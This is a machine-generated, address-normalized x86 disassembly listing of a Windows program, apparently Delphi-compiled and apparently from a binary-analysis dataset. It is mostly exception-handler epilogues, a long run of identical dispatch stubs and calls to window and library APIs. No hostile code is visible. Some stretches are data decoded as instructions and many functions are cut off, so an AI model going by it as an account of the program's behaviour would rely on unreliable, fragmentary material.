pop ebx
pop ecx
pop ebp
retn
sub_46bc94
push ebx
mov ebx edx
mov edx ebx
call sub_453e34
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_44ddc8
pop ebx
retn
sub_46bce8
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46bd50
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_46bd00
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46bd50
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_46bd1c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46bd50
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_46bd34
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_46bd50
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_46bfd0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46bfdc
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46bfe8
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46bff4
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46c000
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46c00c
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46c018
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_418cf8
pop esi
pop ebx
retn
sub_46c02c
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46c048
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418cf8
pop esi
pop ebx
retn
sub_46c05c
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_46c064
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418cf8
pop esi
pop ebx
retn
sub_46c078
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_46c154
mov eax [ eax + 0x54 ]
call sub_418b9c
retn
sub_46c160
mov eax [ eax + 0x54 ]
call sub_418e94
retn
sub_46c3b3
jmp sub_403a98
sub_46c3f7
jmp sub_403a98
sub_46c3fe
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_46c44c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46c24c
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_40416c
pop esi
pop ebx
retn
sub_46c4b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_418cf8
pop esi
pop ebx
retn
sub_46c4cc
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_46c6d1
jmp sub_403a98
sub_46c6d8
pop ebx
mov esp ebp
pop ebp
retn
sub_46c6e0
inc [ eax + 0x8c ]
retn
sub_46c6e8
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_46c708
sub_46c708
xor edx edx
call sub_46cb4c
retn
sub_46cb3e
jmp sub_403a98
sub_46cbc5
jmp sub_403a98
sub_46cbd4
add eax 0x30
call sub_40d814
retn
sub_46cc18
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
j_sub_4037e4#9
jmp sub_4037e4
sub_46cc6e
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_46e56c
call sub_403b4c
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_46d33d
jmp sub_403a98
sub_46d344
pop ebx
mov esp ebp
pop ebp
retn
sub_46d4cc
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_46d4f8
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_46d524
xor edx edx
call sub_46d41c
retn
sub_46d52c
mov dl 0x1
call sub_46d41c
retn
sub_46d5a0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_46d5b8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_46d685
jmp sub_403a98
sub_46d68c
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4037e4#8
jmp sub_4037e4
sub_46e3d4
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_46e42a
jmp sub_4037e4
sub_46e511
jmp sub_4037e4
sub_46e54a
jmp sub_403a98
sub_46e551
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46e558
call sub_40d364
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_46e751
jmp sub_403a98
sub_46e758
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46e81f
jmp sub_403a98
sub_46e826
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e9fc
jmp sub_403a98
sub_46ea03
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46ea64
jmp sub_403a98
sub_46ea6b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46ea74
call sub_46e83c
retn
j_sub_4037e4#7
jmp sub_4037e4
sub_46ecb8
jmp sub_403a98
sub_46ecbf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46eded
jmp sub_403a98
sub_46ef4c
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_46f24b
jmp sub_403a98
sub_46f27a
jmp sub_403a98
sub_46f386
jmp sub_403a98
sub_46f38d
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46f71e
jmp sub_403a98
sub_46f725
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46f848
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_46f893
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_46f8a4
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_46f8b4
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_46f927
jmp sub_403a98
sub_46f92e
pop ebp
retn
sub_46f930
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_46f8c4
call sub_403e68
call sub_46f848
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_4655e0
call sub_418660
sub_47059d
jmp sub_403a98
sub_4705a4
pop ebp
retn
sub_4705a8
sub [ rw-data ] 0x1
retn
sub_4708bd
jmp sub_403a98
sub_4708c8
sub [ rw-data ] 0x1
retn
sub_4709e8
jmp sub_403a98
sub_470a20
push 0x0
push rw-data
call InterlockedExchange
test eax eax
je r-xdata
retn
push eax
call FreeLibrary
call sub_471880
sub_470a3c
mov eax 0x0
call sub_4717cc
jmp eax
sub_470a48
retn
sub_470a4c
mov eax 0x1
call sub_4717cc
jmp eax
sub_470a58
retn
sub_470a5c
mov eax 0x2
call sub_4717cc
jmp eax
sub_470a68
retn
sub_470a6c
mov eax 0x3
call sub_4717cc
jmp eax
sub_470a78
retn
sub_470a7c
mov eax 0x4
call sub_4717cc
jmp eax
sub_470a88
retn
sub_470a8c
mov eax 0x5
call sub_4717cc
jmp eax
sub_470a98
retn
sub_470a9c
mov eax 0x6
call sub_4717cc
jmp eax
sub_470aa8
retn
sub_470aac
mov eax 0x7
call sub_4717cc
jmp eax
sub_470ab8
retn
sub_470abc
mov eax 0x8
call sub_4717cc
jmp eax
sub_470ac8
retn
sub_470acc
mov eax 0x9
call sub_4717cc
jmp eax
sub_470ad8
retn
sub_470adc
mov eax 0xa
call sub_4717cc
jmp eax
sub_470ae8
retn
sub_470aec
mov eax 0xb
call sub_4717cc
jmp eax
sub_470af8
retn
sub_470afc
mov eax 0xc
call sub_4717cc
jmp eax
sub_470b08
retn
sub_470b0c
mov eax 0xd
call sub_4717cc
jmp eax
sub_470b18
retn
sub_470b1c
mov eax 0xe
call sub_4717cc
jmp eax
sub_470b28
retn
sub_470b2c
mov eax 0xf
call sub_4717cc
jmp eax
sub_470b38
retn
sub_470b3c
mov eax 0x10
call sub_4717cc
jmp eax
sub_470b48
retn
sub_470b4c
mov eax 0x11
call sub_4717cc
jmp eax
sub_470b58
retn
sub_470b5c
mov eax 0x12
call sub_4717cc
jmp eax
sub_470b68
retn
sub_470b6c
mov eax 0x13
call sub_4717cc
jmp eax
sub_470b78
retn
sub_470b7c
mov eax 0x14
call sub_4717cc
jmp eax
sub_470b88
retn
sub_470b8c
mov eax 0x15
call sub_4717cc
jmp eax
sub_470b98
retn
sub_470b9c
mov eax 0x16
call sub_4717cc
jmp eax
sub_470ba8
retn
sub_470bac
mov eax 0x17
call sub_4717cc
jmp eax
sub_470bb8
retn
sub_470bbc
mov eax 0x18
call sub_4717cc
jmp eax
sub_470bc8
retn
sub_470bcc
mov eax 0x19
call sub_4717cc
jmp eax
sub_470bd8
retn
sub_470bdc
mov eax 0x1a
call sub_4717cc
jmp eax
sub_470be8
retn
sub_470bec
mov eax 0x1b
call sub_4717cc
jmp eax
sub_470bf8
retn
sub_470bfc
mov eax 0x1c
call sub_4717cc
jmp eax
sub_470c08
retn
sub_470c0c
mov eax 0x1d
call sub_4717cc
jmp eax
sub_470c18
retn
sub_470c1c
mov eax 0x1e
call sub_4717cc
jmp eax
sub_470c28
retn
sub_470c2c
mov eax 0x1f
call sub_4717cc
jmp eax
sub_470c38
retn
sub_470c3c
mov eax 0x20
call sub_4717cc
jmp eax
sub_470c48
retn
sub_470c4c
mov eax 0x21
call sub_4717cc
jmp eax
sub_470c58
retn
sub_470c5c
mov eax 0x22
call sub_4717cc
jmp eax
sub_470c68
retn
sub_470c6c
mov eax 0x23
call sub_4717cc
jmp eax
sub_470c78
retn
sub_470c7c
mov eax 0x24
call sub_4717cc
jmp eax
sub_470c88
retn
sub_470c8c
mov eax 0x25
call sub_4717cc
jmp eax
sub_470c98
retn
sub_470c9c
mov eax 0x26
call sub_4717cc
jmp eax
sub_470ca8
retn
sub_470cac
mov eax 0x27
call sub_4717cc
jmp eax
sub_470cb8
retn
sub_470cbc
mov eax 0x28
call sub_4717cc
jmp eax
sub_470cc8
retn
sub_470ccc
mov eax 0x29
call sub_4717cc
jmp eax
sub_470cd8
retn
sub_470cdc
mov eax 0x2a
call sub_4717cc
jmp eax
sub_470ce8
retn
sub_470cec
mov eax 0x2b
call sub_4717cc
jmp eax
sub_470cf8
retn
sub_470cfc
mov eax 0x2c
call sub_4717cc
jmp eax
sub_470d08
retn
sub_470d0c
mov eax 0x2d
call sub_4717cc
jmp eax
sub_470d18
retn
sub_470d1c
mov eax 0x2e
call sub_4717cc
jmp eax
sub_470d28
retn
sub_470d2c
mov eax 0x2f
call sub_4717cc
jmp eax
sub_470d38
retn
sub_470d3c
mov eax 0x30
call sub_4717cc
jmp eax
sub_470d48
retn
sub_470d4c
mov eax 0x31
call sub_4717cc
jmp eax
sub_470d58
retn
sub_470d5c
mov eax 0x32
call sub_4717cc
jmp eax
sub_470d68
retn
sub_470d6c
mov eax 0x33
call sub_4717cc
jmp eax
sub_470d78
retn
sub_470d7c
mov eax 0x34
call sub_4717cc
jmp eax
sub_470d88
retn
sub_470d8c
mov eax 0x35
call sub_4717cc
jmp eax
sub_470d98
retn
sub_470d9c
mov eax 0x36
call sub_4717cc
jmp eax
sub_470da8
retn
sub_470dac
mov eax 0x37
call sub_4717cc
jmp eax
sub_470db8
retn
sub_470dbc
mov eax 0x38
call sub_4717cc
jmp eax
sub_470dc8
retn
sub_470dcc
mov eax 0x39
call sub_4717cc
jmp eax
sub_470dd8
retn
sub_470ddc
mov eax 0x3a
call sub_4717cc
jmp eax
sub_470de8
retn
sub_470dec
mov eax 0x3b
call sub_4717cc
jmp eax
sub_470df8
retn
sub_470dfc
mov eax 0x3c
call sub_4717cc
jmp eax
sub_470e08
retn
sub_470e0c
mov eax 0x3d
call sub_4717cc
jmp eax
sub_470e18
retn
sub_470e1c
mov eax 0x3e
call sub_4717cc
jmp eax
sub_470e28
retn
sub_470e2c
mov eax 0x3f
call sub_4717cc
jmp eax
sub_470e38
retn
sub_470e3c
mov eax 0x40
call sub_4717cc
jmp eax
sub_470e48
retn
sub_470e4c
mov eax 0x41
call sub_4717cc
jmp eax
sub_470e58
retn
sub_470e5c
mov eax 0x42
call sub_4717cc
jmp eax
sub_470e68
retn
sub_470e6c
mov eax 0x43
call sub_4717cc
jmp eax
sub_470e78
retn
sub_470e7c
mov eax 0x44
call sub_4717cc
jmp eax
sub_470e88
retn
sub_470e8c
mov eax 0x45
call sub_4717cc
jmp eax
sub_470e98
retn
sub_470e9c
mov eax 0x46
call sub_4717cc
jmp eax
sub_470ea8
retn
sub_470eac
mov eax 0x47
call sub_4717cc
jmp eax
sub_470eb8
retn
sub_470ebc
mov eax 0x48
call sub_4717cc
jmp eax
sub_470ec8
retn
sub_470ecc
mov eax 0x49
call sub_4717cc
jmp eax
sub_470ed8
retn
sub_470edc
mov eax 0x4a
call sub_4717cc
jmp eax
sub_470ee8
retn
sub_470eec
mov eax 0x4b
call sub_4717cc
jmp eax
sub_470ef8
retn
sub_470efc
mov eax 0x4c
call sub_4717cc
jmp eax
sub_470f08
retn
sub_470f0c
mov eax 0x4d
call sub_4717cc
jmp eax
sub_470f18
retn
sub_470f1c
mov eax 0x4e
call sub_4717cc
jmp eax
sub_470f28
retn
sub_470f2c
mov eax 0x4f
call sub_4717cc
jmp eax
sub_470f38
retn
sub_470f3c
mov eax 0x50
call sub_4717cc
jmp eax
sub_470f48
retn
sub_470f4c
mov eax 0x51
call sub_4717cc
jmp eax
sub_470f58
retn
sub_470f5c
mov eax 0x52
call sub_4717cc
jmp eax
sub_470f68
retn
sub_470f6c
mov eax 0x53
call sub_4717cc
jmp eax
sub_470f78
retn
sub_470f7c
mov eax 0x54
call sub_4717cc
jmp eax
sub_470f88
retn
sub_470f8c
mov eax 0x55
call sub_4717cc
jmp eax
sub_470f98
retn
sub_470f9c
mov eax 0x56
call sub_4717cc
jmp eax
sub_470fa8
retn
sub_470fac
mov eax 0x57
call sub_4717cc
jmp eax
sub_470fb8
retn
sub_470fbc
mov eax 0x58
call sub_4717cc
jmp eax
sub_470fc8
retn
sub_470fcc
mov eax 0x59
call sub_4717cc
jmp eax
sub_470fd8
retn
sub_470fdc
mov eax 0x5a
call sub_4717cc
jmp eax
sub_470fe8
retn
sub_470fec
mov eax 0x5b
call sub_4717cc
jmp eax
sub_470ff8
retn
sub_470ffc
mov eax 0x5c
call sub_4717cc
jmp eax
sub_471008
retn
sub_47100c
mov eax 0x5d
call sub_4717cc
jmp eax
sub_471018
retn
sub_47101c
mov eax 0x5e
call sub_4717cc
jmp eax
sub_471028
retn
sub_47102c
mov eax 0x5f
call sub_4717cc
jmp eax
sub_471038
retn
sub_47103c
mov eax 0x60
call sub_4717cc
jmp eax
sub_471048
retn
sub_47104c
mov eax 0x61
call sub_4717cc
jmp eax
sub_471058
retn
sub_47105c
mov eax 0x62
call sub_4717cc
jmp eax
sub_471068
retn
sub_47106c
mov eax 0x63
call sub_4717cc
jmp eax
sub_471078
retn
sub_47107c
mov eax 0x64
call sub_4717cc
jmp eax
sub_471088
retn
sub_47108c
mov eax 0x65
call sub_4717cc
jmp eax
sub_471098
retn
sub_47109c
mov eax 0x66
call sub_4717cc
jmp eax
sub_4710a8
retn
sub_4710ac
mov eax 0x67
call sub_4717cc
jmp eax
sub_4710b8
retn
sub_4710bc
mov eax 0x68
call sub_4717cc
jmp eax
sub_4710c8
retn
sub_4710cc
mov eax 0x69
call sub_4717cc
jmp eax
sub_4710d8
retn
sub_4710dc
mov eax 0x6a
call sub_4717cc
jmp eax
sub_4710e8
retn
sub_4710ec
mov eax 0x6b
call sub_4717cc
jmp eax
sub_4710f8
retn
sub_4710fc
mov eax 0x6c
call sub_4717cc
jmp eax
sub_471108
retn
sub_47110c
mov eax 0x6d
call sub_4717cc
jmp eax
sub_471118
retn
sub_47111c
mov eax 0x6e
call sub_4717cc
jmp eax
sub_471128
retn
sub_47112c
mov eax 0x6f
call sub_4717cc
jmp eax
sub_471138
retn
sub_47186f
jmp sub_403a98
sub_471876
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_471971
jmp sub_403a98
sub_471978
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4719dc
jmp sub_403a98
sub_4719e3
pop ebp
retn
sub_4719e8
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_471880
sub_471a1d
jmp sub_403a98
sub_471a24
pop ebp
retn
sub_471a28
sub [ rw-data ] 0x1
retn
sub_471cb4
push 0xffffffff
lea ecx [ esp + 0x4 ]
call sub_471cc0
retn
sub_471d67
jmp sub_403a98
sub_471d6e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_471dc6
jmp sub_403a98
sub_471dcd
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_471dd4
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403668
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_471df4
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0xc ]
retn
sub_472272
jmp sub_403a98
sub_472279
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47236b
jmp sub_403a98
sub_472372
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_472400
jmp sub_403a98
sub_472407
mov eax [ ebp - 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_472435
jmp sub_403a98
sub_47243c
pop ebp
retn
sub_472440
sub [ rw-data ] 0x1
retn
sub_47263a
jmp sub_403a98
sub_472641
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47271c
jmp sub_403a98
sub_472723
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4727b7
jmp sub_403a98
sub_4727be
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_472834
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_472978
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_472a2b
jmp sub_403a98
sub_472a32
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_472b0d
jmp sub_403a98
sub_472b14
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_472d00
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_472d0c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x4
sub_472d24
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_472d30
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
j_sub_403910#3
jmp sub_403910
sub_472e09
jmp sub_403a98
sub_472e10
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4037e4#5
jmp sub_4037e4
sub_472f39
jmp sub_403a98
sub_472f40
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_472f4c
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_472f58
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_472ffe
jmp sub_403a98
sub_473005
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4730c1
jmp sub_403a98
sub_4730c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4730e5
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_4730de
jmp sub_403a98
sub_4730e5
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4731b3
jmp sub_403a98
sub_4731ba
pop ebx
mov esp ebp
pop ebp
retn
sub_4731c3
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ecx + 0x52 ] dl
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_473266
jmp sub_403a98
sub_47326d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_473306
jmp sub_403a98
sub_47330d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_473392
jmp sub_403a98
sub_473399
pop ecx
pop ebp
retn
sub_47339c
mov eax [ eax + 0x4 ]
retn
sub_4733fa
jmp sub_403a98
sub_473401
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4734dd
jmp sub_403a98
sub_4734e4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473525
jmp sub_403a98
sub_47352c
pop ebp
retn
sub_473530
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
mov edx [ sub_472448 ]
mov [ eax ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_473028
sub_473581
jmp sub_403a98
sub_473588
pop ebp
retn
sub_47358c
sub [ rw-data ] 0x1
retn
sub_473863
jmp sub_403a98
sub_47386a
pop ecx
pop ecx
pop ebp
retn
sub_4738eb
jmp sub_403a98
sub_4738f2
pop ecx
pop ecx
pop ebp
retn
j_sub_4037e4#4
jmp sub_4037e4
sub_473bab
jmp sub_403a98
sub_473bb2
fld [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473be0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40ca24
pop esi
pop ebx
retn
sub_473bf4
cmp edx eax
jge r-xdata
retn
mov eax edx
sub_473ce1
jmp sub_403a98
sub_473ce8
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_473ecf
jmp sub_403a98
sub_473ed6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473f3f
jmp sub_403a98
sub_473f46
pop ebx
pop ecx
pop ebp
retn
sub_473fe3
jmp sub_403a98
sub_473fea
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47413f
jmp sub_403a98
sub_474146
fld [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47421d
jmp sub_403a98
sub_474224
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_474386
jmp sub_403a98
sub_47438d
mov eax edi
mov edi [ ebp - 0x18 ]
mov esi [ ebp - 0x14 ]
mov ebx [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn 0x4
sub_47442b
jmp sub_403a98
sub_474432
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_474543
jmp sub_403a98
sub_47454a
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4037e4#3
jmp sub_4037e4
sub_4747c0
jmp sub_403a98
sub_4747c7
fld [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47486a
jmp sub_403a98
sub_474871
fld [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_474884
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
sete al
retn
sub_474898
call sub_40471c
retn
sub_47492c
push ebx
mov ebx eax
mov eax ebx
call sub_41bbd8
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
pop ebx
retn
sub_474944
xor eax eax
retn
sub_4749fb
jmp sub_403a98
sub_474a02
pop ebp
retn
sub_474ad7
jmp sub_403a98
sub_474ade
pop ecx
pop ebp
retn
sub_474c0c
retn
j_sub_474c0c
jmp sub_474c0c
sub_474c14
pop ebp
retn
sub_474c18
sub [ rw-data ] 0x1
retn
sub_474e17
jmp sub_403a98
sub_474e1e
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_474ef9
jmp sub_403a98
sub_474f00
pop ebp
retn
sub_474f04
sub [ rw-data ] 0x1
retn
sub_475292
jmp sub_403a98
sub_475299
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47531f
jmp sub_403a98
sub_475326
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4036b8
sub_4753ef
jmp sub_403a98
sub_4753f6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_475520
jmp sub_403a98
sub_475527
pop ebp
retn
sub_47552c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_475498
call sub_403e40
mov dl 0x1
mov eax [ r-xdata ]
call sub_42ca54
mov [ rw-data ] eax
sub_475558
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_475ae4
jmp sub_403a98
sub_475aeb
pop ebx
mov esp ebp
pop ebp
retn
sub_475c78
jmp sub_403a98
sub_475c95
jmp sub_403a98
sub_475c9c
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_475e15
jmp sub_403a98
sub_475e1c
pop ebp
retn
sub_475e20
sub [ rw-data ] 0x1
retn
sub_475f8c
add eax 0x68
call sub_40d814
retn
sub_47600c
cmp [ eax + 0x70 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x68 ]
test edx edx
je r-xdata
xor eax eax
retn
cmp [ edx + 0x10 ] 0x0
jne r-xdata
sub_47606c
push ebx
mov ebx eax
mov eax ebx
call sub_421ecc
mov al [ ebx + 0x70 ]
mov [ ebx + 0x70 ] 0x0
mov edx eax
mov eax ebx
call sub_476088
pop ebx
retn
sub_476145
jmp sub_403a98
sub_47614c
pop ebp
retn
sub_476150
sub [ rw-data ] 0x1
retn
sub_4762cc
retn
sub_4762cd
jmp sub_403a98
j_sub_4762cc
jmp sub_4762cc
sub_4762d4
pop ebp
retn
sub_4762d8
sub [ rw-data ] 0x1
retn
sub_476305
jmp sub_403a98
sub_47630c
pop ebp
retn
sub_476310
sub [ rw-data ] 0x1
retn
sub_476461
jmp sub_403a98
sub_476468
pop ebp
retn
sub_47646c
sub [ rw-data ] 0x1
retn
sub_47682b
jmp sub_403a98
sub_476832
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4768e8
jmp sub_403a98
sub_4768ef
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4769d9
jmp sub_403a98
sub_4769e0
pop ebx
mov esp ebp
pop ebp
retn
sub_476c15
jmp sub_403a98
sub_476c1c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_476e91
jmp sub_403a98
sub_476e98
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_477565
jmp sub_403a98
sub_47756c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_477624
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419a40
pop esi
pop ebx
retn
sub_477add
jmp sub_403a98
sub_477ae4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_477b65
jmp sub_403a98
sub_477b6c
pop ebp
retn
sub_477b70
sub [ rw-data ] 0x1
retn
sub_477eae
jmp sub_403a98
sub_477eb5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_477fd4
jmp sub_403a98
sub_477fdb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47808f
jmp sub_403a98
sub_478096
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4780c0
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40413c
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_4780b9
jmp sub_403a98
sub_4780c0
pop edi
